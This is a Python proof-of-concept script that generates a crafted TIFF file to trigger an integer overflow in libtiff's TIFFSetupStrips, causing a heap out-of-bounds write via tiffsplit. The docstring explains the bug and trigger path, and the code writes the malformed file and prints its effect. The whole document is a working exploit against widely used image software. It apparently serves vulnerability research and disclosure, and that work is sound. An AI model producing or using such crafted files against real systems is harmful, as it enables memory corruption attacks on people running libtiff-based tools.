#!/usr/bin/env python3
"""
PoC generator for libtiff TIFFSetupStrips() integer overflow.

Vulnerability: tif_write.c TIFFSetupStrips()
  td->td_stripoffset = (uint32 *) _TIFFmalloc(td->td_nstrips * sizeof(uint32));
  tsize_t = int32, so _TIFFmalloc receives int32 argument.
  With td->td_nstrips = 0x40000001:
    0x40000001 * 4 = 0x100000004 => truncated to int32 => 4
  Only 4 bytes allocated (room for 1 uint32), but td->td_nstrips stays 0x40000001.
  Writing strip index 1 writes to td_stripoffset[1] which is OOB.

Trigger path via tiffsplit:
  tiffsplit reads input -> cpStrips -> s=0: TIFFWriteRawStrip(out,0,...) triggers
  TIFFSetupStrips on output (under-allocates) -> s=1: TIFFWriteRawStrip(out,1,...)
  writes to td_stripoffset[1] (4 bytes past end of 4-byte allocation) -> OOB WRITE.
"""

import struct
import sys
import os

def pack_ifd_entry(tag, type_, count, value_or_offset):
    """Pack a 12-byte IFD entry (little-endian)."""
    return struct.pack('<HHII', tag, type_, count, value_or_offset)

def build_tiff():
    # TIFF types
    SHORT = 3
    LONG  = 4

    # Tags
    TAG_IMAGEWIDTH       = 256
    TAG_IMAGELENGTH      = 257
    TAG_BITSPERSAMPLE    = 258
    TAG_COMPRESSION      = 259
    TAG_PHOTOMETRIC      = 262
    TAG_STRIPOFFSETS     = 273
    TAG_SAMPLESPERPIXEL  = 277
    TAG_ROWSPERSTRIP     = 278
    TAG_STRIPBYTECOUNTS  = 279
    TAG_PLANARCONFIG     = 284

    # The critical value: td->td_nstrips = 0x40000001
    # TIFFNumberOfStrips = ceil(ImageLength / RowsPerStrip)
    # With RowsPerStrip=1: ImageLength = 0x40000001
    IMAGE_LENGTH = 0x40000001
    ROWS_PER_STRIP = 1
    IMAGE_WIDTH = 1

    # File layout:
    #  Offset 0: TIFF header (8 bytes)
    #  Offset 8: IFD (2 + 10*12 + 4 = 126 bytes)
    #  Offset 134: StripOffsets array (2 LONGs = 8 bytes)
    #  Offset 142: StripByteCounts array (2 LONGs = 8 bytes)
    #  Offset 150: pixel data strip 0 (1 byte)
    #  Offset 151: pixel data strip 1 (1 byte)

    IFD_OFFSET        = 8
    NENTRIES          = 10
    IFD_SIZE          = 2 + NENTRIES * 12 + 4
    STRIP_OFFSETS_ARR = IFD_OFFSET + IFD_SIZE          # 134
    STRIP_BYTECNTS_ARR = STRIP_OFFSETS_ARR + 8         # 142
    DATA_STRIP0       = STRIP_BYTECNTS_ARR + 8         # 150
    DATA_STRIP1       = DATA_STRIP0 + 1                # 151

    # IFD entries (must be in ascending tag order)
    entries = [
        pack_ifd_entry(TAG_IMAGEWIDTH,    LONG,  1, IMAGE_WIDTH),
        pack_ifd_entry(TAG_IMAGELENGTH,   LONG,  1, IMAGE_LENGTH),
        pack_ifd_entry(TAG_BITSPERSAMPLE, SHORT, 1, 8),
        pack_ifd_entry(TAG_COMPRESSION,   SHORT, 1, 1),  # no compression
        pack_ifd_entry(TAG_PHOTOMETRIC,   SHORT, 1, 1),  # BlackIsZero
        # StripOffsets: count=2, value=offset to external array
        pack_ifd_entry(TAG_STRIPOFFSETS,  LONG,  2, STRIP_OFFSETS_ARR),
        pack_ifd_entry(TAG_SAMPLESPERPIXEL, SHORT, 1, 1),
        pack_ifd_entry(TAG_ROWSPERSTRIP,  LONG,  1, ROWS_PER_STRIP),
        # StripByteCounts: count=2, value=offset to external array
        pack_ifd_entry(TAG_STRIPBYTECOUNTS, LONG, 2, STRIP_BYTECNTS_ARR),
        pack_ifd_entry(TAG_PLANARCONFIG,  SHORT, 1, 1),  # PLANARCONFIG_CONTIG
    ]

    # TIFF header (little-endian)
    header = b'II'                           # byte order: little-endian
    header += struct.pack('<H', 42)          # TIFF magic
    header += struct.pack('<I', IFD_OFFSET)  # offset to first IFD

    # IFD
    ifd  = struct.pack('<H', NENTRIES)       # entry count
    ifd += b''.join(entries)
    ifd += struct.pack('<I', 0)              # next IFD offset = 0 (none)

    # External arrays
    strip_offsets_data   = struct.pack('<II', DATA_STRIP0, DATA_STRIP1)
    strip_bytecnts_data  = struct.pack('<II', 1, 1)

    # Actual pixel data (1 byte each strip)
    pixel_data = b'\x00\x00'

    # Assemble
    tiff = header + ifd + strip_offsets_data + strip_bytecnts_data + pixel_data

    # Verify offsets
    assert len(header) == 8, f"header size mismatch: {len(header)}"
    assert IFD_OFFSET == 8
    assert len(ifd) == IFD_SIZE, f"IFD size mismatch: {len(ifd)} vs {IFD_SIZE}"
    assert len(tiff) == DATA_STRIP1 + 1

    return tiff


if __name__ == '__main__':
    out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001.tif')
    data = build_tiff()
    with open(out_path, 'wb') as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {out_path}")
    print(f"[+] ImageLength = 0x40000001, RowsPerStrip = 1")
    print(f"[+] TIFFNumberOfStrips = 0x40000001")
    print(f"[+] _TIFFmalloc(0x40000001 * 4 = 0x100000004) -> int32 truncation -> _TIFFmalloc(4)")
    print(f"[+] td_stripoffset[1] write is OOB by 4 bytes -> heap-buffer-overflow")
